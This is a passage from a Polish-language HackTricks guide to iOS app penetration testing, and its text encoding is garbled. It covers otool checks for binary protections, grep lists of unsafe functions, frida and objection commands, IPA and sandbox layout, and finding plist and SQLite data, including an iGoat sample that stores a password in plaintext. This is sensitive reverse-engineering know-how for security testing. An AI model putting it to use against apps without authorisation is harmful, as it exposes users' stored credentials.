# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting), aby Å‚atwo budowaÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** zasilane przez **najbardziej zaawansowane** narzÄ™dzia spoÅ‚ecznoÅ›ciowe na Å›wiecie.\
Uzyskaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
{% endhint %}

## iOS Basics

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Testing Environment

Na tej stronie znajdziesz informacje o **symulatorze iOS**, **emulatorach** i **jailbreaku:**

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## Initial Analysis

### Basic iOS Testing Operations

Podczas testowania **zostanie zasugerowanych kilka operacji** (poÅ‚Ä…czenie z urzÄ…dzeniem, odczyt/zapis/przesyÅ‚anie/pobieranie plikÃ³w, uÅ¼ycie niektÃ³rych narzÄ™dzi...). Dlatego, jeÅ›li nie wiesz, jak wykonaÄ‡ ktÃ³rÄ…kolwiek z tych czynnoÅ›ci, proszÄ™, **zacznij czytaÄ‡ stronÄ™**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
Dla kolejnych krokÃ³w **aplikacja powinna byÄ‡ zainstalowana** na urzÄ…dzeniu i powinna juÅ¼ uzyskaÄ‡ **plik IPA** aplikacji.\
Przeczytaj stronÄ™ [Podstawowe operacje testowania iOS](basic-ios-testing-operations.md), aby dowiedzieÄ‡ siÄ™, jak to zrobiÄ‡.
{% endhint %}

### Basic Static Analysis

Zaleca siÄ™ uÅ¼ycie narzÄ™dzia [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) do przeprowadzenia automatycznej analizy statycznej pliku IPA.

Identyfikacja **ochron obecnych w binarnym**:

*   **PIE (Position Independent Executable)**: Gdy jest wÅ‚Ä…czone, aplikacja Å‚adowana jest do losowego adresu pamiÄ™ci za kaÅ¼dym razem, gdy jest uruchamiana, co utrudnia przewidywanie jej poczÄ…tkowego adresu pamiÄ™ci.

```bash
otool -hv <app-binary> | grep PIE   # Powinno zawieraÄ‡ flagÄ™ PIE
```
*   **Stack Canaries**: Aby zweryfikowaÄ‡ integralnoÅ›Ä‡ stosu, wartoÅ›Ä‡ â€canaryâ€ jest umieszczana na stosie przed wywoÅ‚aniem funkcji i jest weryfikowana ponownie po zakoÅ„czeniu funkcji.

```bash
otool -I -v <app-binary> | grep stack_chk   # Powinno zawieraÄ‡ symbole: stack_chk_guard i stack_chk_fail
```
*   **ARC (Automatic Reference Counting)**: Aby zapobiec powszechnym bÅ‚Ä™dom uszkodzenia pamiÄ™ci

```bash
otool -I -v <app-binary> | grep objc_release   # Powinno zawieraÄ‡ symbol _objc_release
```
*   **Zaszyfrowany plik binarny**: Plik binarny powinien byÄ‡ zaszyfrowany

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # Cryptid powinien wynosiÄ‡ 1
```

**Identyfikacja wraÅ¼liwych/niebezpiecznych funkcji**

*   **SÅ‚abe algorytmy haszujÄ…ce**

```bash
# Na urzÄ…dzeniu iOS
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Na linuxie
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **Niebezpieczne funkcje losowe**

```bash
# Na urzÄ…dzeniu iOS
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Na linuxie
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **Niebezpieczna funkcja â€˜Mallocâ€™**

```bash
# Na urzÄ…dzeniu iOS
otool -Iv <app> | grep -w "_malloc"

# Na linuxie
grep -iER "_malloc"
```
*   **Niebezpieczne i podatne funkcje**

```bash
# Na urzÄ…dzeniu iOS
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Na linuxie
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### Basic Dynamic Analysis

SprawdÅº analizÄ™ dynamicznÄ…, ktÃ³rÄ… przeprowadza [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF). BÄ™dziesz musiaÅ‚ nawigowaÄ‡ przez rÃ³Å¼ne widoki i wchodziÄ‡ z nimi w interakcje, ale bÄ™dzie to podÅ‚Ä…czaÄ‡ kilka klas podczas wykonywania innych czynnoÅ›ci i przygotuje raport, gdy skoÅ„czysz.

### Listing Installed Apps

UÅ¼yj polecenia `frida-ps -Uai`, aby okreÅ›liÄ‡ **identyfikator pakietu** zainstalowanych aplikacji:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Podstawowa enumeracja i hooking

Dowiedz siÄ™, jak **enumerowaÄ‡ komponenty aplikacji** i jak Å‚atwo **hookowaÄ‡ metody i klasy** za pomocÄ… objection:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### Struktura IPA

Struktura **pliku IPA** jest zasadniczo taka sama jak **spakowany pakiet**. ZmieniajÄ…c jego rozszerzenie na `.zip`, moÅ¼na go **rozpakowaÄ‡**, aby ujawniÄ‡ jego zawartoÅ›Ä‡. W tej strukturze, **Bundle** reprezentuje w peÅ‚ni zapakowanÄ… aplikacjÄ™ gotowÄ… do instalacji. WewnÄ…trz znajdziesz katalog o nazwie `<NAME>.app`, ktÃ³ry zawiera zasoby aplikacji.

* **`Info.plist`**: Ten plik zawiera szczegÃ³Å‚owe informacje konfiguracyjne aplikacji.
* **`_CodeSignature/`**: Ten katalog zawiera plik plist, ktÃ³ry zawiera podpis, zapewniajÄ…c integralnoÅ›Ä‡ wszystkich plikÃ³w w pakiecie.
* **`Assets.car`**: Skompresowany archiwum, ktÃ³re przechowuje pliki zasobÃ³w, takie jak ikony.
* **`Frameworks/`**: Ten folder zawiera natywne biblioteki aplikacji, ktÃ³re mogÄ… byÄ‡ w formie plikÃ³w `.dylib` lub `.framework`.
* **`PlugIns/`**: MoÅ¼e zawieraÄ‡ rozszerzenia do aplikacji, znane jako pliki `.appex`, chociaÅ¼ nie zawsze sÄ… obecne. \* [**`Core Data`**](https://developer.apple.com/documentation/coredata): Jest uÅ¼ywane do zapisywania trwaÅ‚ych danych aplikacji do uÅ¼ytku offline, do buforowania danych tymczasowych oraz do dodawania funkcji cofania do aplikacji na jednym urzÄ…dzeniu. Aby synchronizowaÄ‡ dane miÄ™dzy wieloma urzÄ…dzeniami w jednym koncie iCloud, Core Data automatycznie odzwierciedla schemat do kontenera CloudKit.
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): Plik `PkgInfo` to alternatywny sposÃ³b okreÅ›lenia typu i kodÃ³w twÃ³rcy aplikacji lub pakietu.
* **en.lproj, fr.proj, Base.lproj**: To pakiety jÄ™zykowe, ktÃ³re zawierajÄ… zasoby dla tych konkretnych jÄ™zykÃ³w oraz domyÅ›lny zasÃ³b na wypadek, gdy dany jÄ™zyk nie jest obsÅ‚ugiwany.
* **BezpieczeÅ„stwo**: Katalog `_CodeSignature/` odgrywa kluczowÄ… rolÄ™ w bezpieczeÅ„stwie aplikacji, weryfikujÄ…c integralnoÅ›Ä‡ wszystkich plikÃ³w w pakiecie za pomocÄ… podpisÃ³w cyfrowych.
* **ZarzÄ…dzanie zasobami**: Plik `Assets.car` wykorzystuje kompresjÄ™ do efektywnego zarzÄ…dzania zasobami graficznymi, co jest kluczowe dla optymalizacji wydajnoÅ›ci aplikacji i zmniejszenia jej ogÃ³lnego rozmiaru.
* **Frameworki i PlugIns**: Te katalogi podkreÅ›lajÄ… modularnoÅ›Ä‡ aplikacji iOS, umoÅ¼liwiajÄ…c programistom doÅ‚Ä…czanie wielokrotnego uÅ¼ytku bibliotek kodu (`Frameworks/`) i rozszerzanie funkcjonalnoÅ›ci aplikacji (`PlugIns/`).
* **Lokalizacja**: Struktura wspiera wiele jÄ™zykÃ³w, uÅ‚atwiajÄ…c globalny zasiÄ™g aplikacji poprzez doÅ‚Ä…czanie zasobÃ³w dla konkretnych pakietÃ³w jÄ™zykowych.

**Info.plist**

**Info.plist** jest fundamentem aplikacji iOS, zawierajÄ…cym kluczowe dane konfiguracyjne w formie par **klucz-wartoÅ›Ä‡**. Ten plik jest wymagany nie tylko dla aplikacji, ale takÅ¼e dla rozszerzeÅ„ aplikacji i frameworkÃ³w zapakowanych w Å›rodku. Jest zbudowany w formacie XML lub binarnym i zawiera krytyczne informacje, od uprawnieÅ„ aplikacji po konfiguracje bezpieczeÅ„stwa. Aby szczegÃ³Å‚owo zbadaÄ‡ dostÄ™pne klucze, moÅ¼na odwoÅ‚aÄ‡ siÄ™ do [**Dokumentacji Dewelopera Apple**](https://developer.apple.com/documentation/bundleresources/information\_property\_list?language=objc).

Dla tych, ktÃ³rzy chcÄ… pracowaÄ‡ z tym plikiem w bardziej dostÄ™pnym formacie, konwersja XML moÅ¼e byÄ‡ osiÄ…gniÄ™ta bez wysiÅ‚ku za pomocÄ… `plutil` na macOS (dostÄ™pne natywnie w wersjach 10.2 i nowszych) lub `plistutil` na Linuxie. Komendy do konwersji sÄ… nastÄ™pujÄ…ce:

* **Dla macOS**:
```bash
$ plutil -convert xml1 Info.plist
```
* **Dla Linuksa**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
WÅ›rÃ³d niezliczonych informacji, ktÃ³re plik **Info.plist** moÅ¼e ujawniÄ‡, szczegÃ³lnie istotne wpisy to ciÄ…gi uprawnieÅ„ aplikacji (`UsageDescription`), niestandardowe schematy URL (`CFBundleURLTypes`) oraz konfiguracje dla App Transport Security (`NSAppTransportSecurity`). Wpisy te, wraz z innymi, takimi jak eksportowane/importowane niestandardowe typy dokumentÃ³w (`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`), moÅ¼na Å‚atwo zlokalizowaÄ‡, przeglÄ…dajÄ…c plik lub uÅ¼ywajÄ…c prostego polecenia `grep`:
```bash
$ grep -i <keyword> Info.plist
```
**ÅšcieÅ¼ki danych**

W Å›rodowisku iOS, katalogi sÄ… wyznaczone specjalnie dla **aplikacji systemowych** i **aplikacji zainstalowanych przez uÅ¼ytkownika**. Aplikacje systemowe znajdujÄ… siÄ™ w katalogu `/Applications`, podczas gdy aplikacje zainstalowane przez uÅ¼ytkownika sÄ… umieszczane w `/var/mobile/containers/Data/Application/`. Te aplikacje majÄ… przypisany unikalny identyfikator znany jako **128-bitowy UUID**, co utrudnia rÄ™czne zlokalizowanie folderu aplikacji z powodu losowoÅ›ci nazw katalogÃ³w.

{% hint style="warning" %}
PoniewaÅ¼ aplikacje w iOS muszÄ… byÄ‡ izolowane, kaÅ¼da aplikacja bÄ™dzie miaÅ‚a rÃ³wnieÅ¼ folder wewnÄ…trz **`$HOME/Library/Containers`** z **`CFBundleIdentifier`** aplikacji jako nazwÄ… folderu.

Jednak oba foldery (foldery danych i kontenerÃ³w) majÄ… plik **`.com.apple.mobile_container_manager.metadata.plist`**, ktÃ³ry Å‚Ä…czy oba pliki w kluczu `MCMetadataIdentifier`).
{% endhint %}

Aby uÅ‚atwiÄ‡ odkrycie katalogu instalacyjnego aplikacji zainstalowanej przez uÅ¼ytkownika, narzÄ™dzie **objection** oferuje przydatne polecenie, `env`. To polecenie ujawnia szczegÃ³Å‚owe informacje o katalogu dla danej aplikacji. PoniÅ¼ej znajduje siÄ™ przykÅ‚ad uÅ¼ycia tego polecenia:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Alternatywnie, nazwa aplikacji moÅ¼e byÄ‡ wyszukiwana w `/private/var/containers` za pomocÄ… polecenia `find`:
```bash
find /private/var/containers -name "Progname*"
```
Polecenia takie jak `ps` i `lsof` mogÄ… byÄ‡ rÃ³wnieÅ¼ wykorzystane do zidentyfikowania procesu aplikacji i wylistowania otwartych plikÃ³w, odpowiednio, dostarczajÄ…c informacji na temat aktywnych Å›cieÅ¼ek katalogÃ³w aplikacji:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Bundle directory:**

* **AppName.app**
* To jest pakiet aplikacji, jak wczeÅ›niej widziano w IPA, zawiera niezbÄ™dne dane aplikacji, statyczne treÅ›ci oraz skompilowany plik binarny aplikacji.
* Ten katalog jest widoczny dla uÅ¼ytkownikÃ³w, ale **uÅ¼ytkownicy nie mogÄ… do niego pisaÄ‡**.
* ZawartoÅ›Ä‡ tego katalogu **nie jest kopiowana**.
* ZawartoÅ›Ä‡ tego folderu jest uÅ¼ywana do **walidacji podpisu kodu**.

**Data directory:**

* **Documents/**
* Zawiera wszystkie dane generowane przez uÅ¼ytkownika. UÅ¼ytkownik koÅ„cowy aplikacji inicjuje tworzenie tych danych.
* Widoczny dla uÅ¼ytkownikÃ³w i **uÅ¼ytkownicy mogÄ… do niego pisaÄ‡**.
* ZawartoÅ›Ä‡ tego katalogu **jest kopiowana**.
* Aplikacja moÅ¼e wyÅ‚Ä…czyÄ‡ Å›cieÅ¼ki, ustawiajÄ…c `NSURLIsExcludedFromBackupKey`.
* **Library/**
* Zawiera wszystkie **pliki, ktÃ³re nie sÄ… specyficzne dla uÅ¼ytkownika**, takie jak **cache**, **preferencje**, **ciasteczka** i pliki konfiguracyjne listy wÅ‚aÅ›ciwoÅ›ci (plist).
* Aplikacje iOS zazwyczaj uÅ¼ywajÄ… podkatalogÃ³w `Application Support` i `Caches`, ale aplikacja moÅ¼e tworzyÄ‡ wÅ‚asne podkatalogi.
* **Library/Caches/**
* Zawiera **pÃ³Å‚trwaÅ‚e pliki cache.**
* Niewidoczny dla uÅ¼ytkownikÃ³w i **uÅ¼ytkownicy nie mogÄ… do niego pisaÄ‡**.
* ZawartoÅ›Ä‡ tego katalogu **nie jest kopiowana**.
* System operacyjny moÅ¼e automatycznie usunÄ…Ä‡ pliki z tego katalogu, gdy aplikacja nie jest uruchomiona, a miejsce na dysku jest ograniczone.
* **Library/Application Support/**
* Zawiera **trwaÅ‚e** **pliki** niezbÄ™dne do dziaÅ‚ania aplikacji.
* **Niewidoczny** **dla** **uÅ¼ytkownikÃ³w** i uÅ¼ytkownicy nie mogÄ… do niego pisaÄ‡.
* ZawartoÅ›Ä‡ tego katalogu **jest kopiowana**.
* Aplikacja moÅ¼e wyÅ‚Ä…czyÄ‡ Å›cieÅ¼ki, ustawiajÄ…c `NSURLIsExcludedFromBackupKey`.
* **Library/Preferences/**
* UÅ¼ywany do przechowywania wÅ‚aÅ›ciwoÅ›ci, ktÃ³re mogÄ… **utrzymywaÄ‡ siÄ™ nawet po ponownym uruchomieniu aplikacji**.
* Informacje sÄ… zapisywane, niezaszyfrowane, wewnÄ…trz piaskownicy aplikacji w pliku plist o nazwie \[BUNDLE\_ID].plist.
* Wszystkie pary klucz/wartoÅ›Ä‡ przechowywane za pomocÄ… `NSUserDefaults` moÅ¼na znaleÅºÄ‡ w tym pliku.
* **tmp/**
* UÅ¼yj tego katalogu do zapisywania **plikÃ³w tymczasowych**, ktÃ³re nie muszÄ… siÄ™ utrzymywaÄ‡ miÄ™dzy uruchomieniami aplikacji.
* Zawiera nietrwaÅ‚e pliki cache.
* **Niewidoczny** dla uÅ¼ytkownikÃ³w.
* ZawartoÅ›Ä‡ tego katalogu nie jest kopiowana.
* System operacyjny moÅ¼e automatycznie usunÄ…Ä‡ pliki z tego katalogu, gdy aplikacja nie jest uruchomiona, a miejsce na dysku jest ograniczone.

Przyjrzyjmy siÄ™ bliÅ¼ej katalogowi pakietu aplikacji iGoat-Swift (.app) wewnÄ…trz katalogu Bundle (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Binary Reversing

W folderze `<application-name>.app` znajdziesz plik binarny o nazwie `<application-name>`. To jest plik, ktÃ³ry bÄ™dzie **wykonywany**. MoÅ¼esz przeprowadziÄ‡ podstawowÄ… inspekcjÄ™ pliku binarnego za pomocÄ… narzÄ™dzia **`otool`**:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**SprawdÅº, czy aplikacja jest zaszyfrowana**

Zobacz, czy jest jakiekolwiek wyjÅ›cie dla:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**RozkÅ‚adanie binarnego**

RozÅ‚Ã³Å¼ sekcjÄ™ tekstowÄ…:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Aby wydrukowaÄ‡ **segment Objective-C** przykÅ‚adowej aplikacji, moÅ¼na uÅ¼yÄ‡:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Aby uzyskaÄ‡ bardziej zwarty kod Objective-C, moÅ¼esz uÅ¼yÄ‡ [**class-dump**](http://stevenygard.com/projects/class-dump/):
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Jednak najlepsze opcje do deasemblacji binarnego to: [**Hopper**](https://www.hopperapp.com/download.html?) i [**IDA**](https://www.hex-rays.com/products/ida/support/download\_freeware/).

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting), aby Å‚atwo budowaÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** zasilane przez **najbardziej zaawansowane** narzÄ™dzia spoÅ‚ecznoÅ›ciowe na Å›wiecie.\
Uzyskaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}

## Przechowywanie danych

Aby dowiedzieÄ‡ siÄ™, jak iOS przechowuje dane na urzÄ…dzeniu, przeczytaj tÄ™ stronÄ™:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
NastÄ™pujÄ…ce miejsca do przechowywania informacji powinny byÄ‡ sprawdzone **zaraz po zainstalowaniu aplikacji**, **po sprawdzeniu wszystkich funkcjonalnoÅ›ci** aplikacji, a nawet po **wylogowaniu siÄ™ z jednego uÅ¼ytkownika i zalogowaniu siÄ™ na innego**.\
Celem jest znalezienie **niechronionych wraÅ¼liwych informacji** aplikacji (hasÅ‚a, tokeny), bieÅ¼Ä…cego uÅ¼ytkownika oraz wczeÅ›niej zalogowanych uÅ¼ytkownikÃ³w.
{% endhint %}

### Plist

Pliki **plist** to strukturalne pliki XML, ktÃ³re **zawierajÄ… pary klucz-wartoÅ›Ä‡**. To sposÃ³b na przechowywanie danych trwaÅ‚ych, wiÄ™c czasami moÅ¼esz znaleÅºÄ‡ **wraÅ¼liwe informacje w tych plikach**. Zaleca siÄ™ sprawdzenie tych plikÃ³w po zainstalowaniu aplikacji i po intensywnym korzystaniu z niej, aby zobaczyÄ‡, czy zapisano nowe dane.

NajczÄ™stszym sposobem na trwaÅ‚e przechowywanie danych w plikach plist jest uÅ¼ycie **NSUserDefaults**. Ten plik plist jest zapisywany wewnÄ…trz piaskownicy aplikacji w **`Library/Preferences/<appBundleID>.plist`**

Klasa [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) zapewnia programowy interfejs do interakcji z domyÅ›lnym systemem. DomyÅ›lny system pozwala aplikacji dostosowaÄ‡ swoje zachowanie zgodnie z **preferencjami uÅ¼ytkownika**. Dane zapisane przez `NSUserDefaults` moÅ¼na przeglÄ…daÄ‡ w pakiecie aplikacji. Ta klasa przechowuje **dane** w pliku **plist**, ale jest przeznaczona do uÅ¼ycia z maÅ‚ymi iloÅ›ciami danych.

Dane te nie mogÄ… byÄ‡ dÅ‚uÅ¼ej bezpoÅ›rednio dostÄ™pne za pomocÄ… zaufanego komputera, ale moÅ¼na uzyskaÄ‡ do nich dostÄ™p, wykonujÄ…c **kopiÄ™ zapasowÄ…**.

MoÅ¼esz **zrzuciÄ‡** informacje zapisane za pomocÄ… **`NSUserDefaults`** uÅ¼ywajÄ…c `ios nsuserdefaults get` z objection.

Aby znaleÅºÄ‡ wszystkie pliki plist uÅ¼ywane przez aplikacjÄ™, moÅ¼esz uzyskaÄ‡ dostÄ™p do `/private/var/mobile/Containers/Data/Application/{APPID}` i uruchomiÄ‡:
```bash
find ./ -name "*.plist"
```
Aby przekonwertowaÄ‡ pliki z formatu **XML lub binarnego (bplist)** na XML, dostÄ™pne sÄ… rÃ³Å¼ne metody w zaleÅ¼noÅ›ci od systemu operacyjnego:

**Dla uÅ¼ytkownikÃ³w macOS:** Wykorzystaj polecenie `plutil`. To wbudowane narzÄ™dzie w macOS (10.2+), zaprojektowane do tego celu:
```bash
$ plutil -convert xml1 Info.plist
```
**Dla uÅ¼ytkownikÃ³w Linuksa:** Najpierw zainstaluj `libplist-utils`, a nastÄ™pnie uÅ¼yj `plistutil`, aby przekonwertowaÄ‡ swÃ³j plik:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**W sesji Objection:** Do analizy aplikacji mobilnych, konkretne polecenie pozwala na bezpoÅ›rednie konwertowanie plikÃ³w plist:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple\_ref/doc/uid/TP40001075-CH8-SW1) to framework do zarzÄ…dzania warstwÄ… modelu obiektÃ³w w Twojej aplikacji. [Core Data moÅ¼e uÅ¼ywaÄ‡ SQLite jako swojego trwaÅ‚ego magazynu](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), ale sam framework nie jest bazÄ… danych.\
CoreData nie szyfruje swoich danych domyÅ›lnie. Jednak dodatkowa warstwa szyfrowania moÅ¼e byÄ‡ dodana do CoreData. Zobacz [GitHub Repo](https://github.com/project-imas/encrypted-core-data) po wiÄ™cej szczegÃ³Å‚Ã³w.

MoÅ¼esz znaleÅºÄ‡ informacje o SQLite Core Data aplikacji w Å›cieÅ¼ce `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**JeÅ›li moÅ¼esz otworzyÄ‡ SQLite i uzyskaÄ‡ dostÄ™p do wraÅ¼liwych informacji, to znalazÅ‚eÅ› bÅ‚Ä™dnÄ… konfiguracjÄ™.**

{% code title="Code from iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) to magazyn klucz/wartoÅ›Ä‡ zbudowany na bazie SQLite.\
PoniewaÅ¼ bazy danych Yap sÄ… bazami danych sqlite, moÅ¼esz je znaleÅºÄ‡, uÅ¼ywajÄ…c zaproponowanej komendy w poprzedniej sekcji.

### Inne bazy danych SQLite

PowszechnÄ… praktykÄ… jest, Å¼e aplikacje tworzÄ… wÅ‚asne bazy danych sqlite. MogÄ… one **przechowywaÄ‡** **wraÅ¼liwe** **dane** i pozostawiaÄ‡ je niezaszyfrowane. Dlatego zawsze warto sprawdziÄ‡ kaÅ¼dÄ… bazÄ™ danych w katalogu aplikacji. PrzejdÅº wiÄ™c do katalogu aplikacji, w ktÃ³rym zapisane sÄ… dane (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebase Real-Time Databases

ProgramiÅ›ci mogÄ… **przechowywaÄ‡ i synchronizowaÄ‡ dane** w **bazie danych NoSQL hostowanej w chmurze** za pomocÄ… Firebase Real-Time Databases. Przechowywane w formacie JSON, dane sÄ… synchronizowane do wszystkich podÅ‚Ä…czonych klientÃ³w w czasie rzeczywistym.

MoÅ¼esz znaleÅºÄ‡, jak sprawdziÄ‡ Åºle skonfigurowane bazy danych Firebase tutaj:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Realm databases

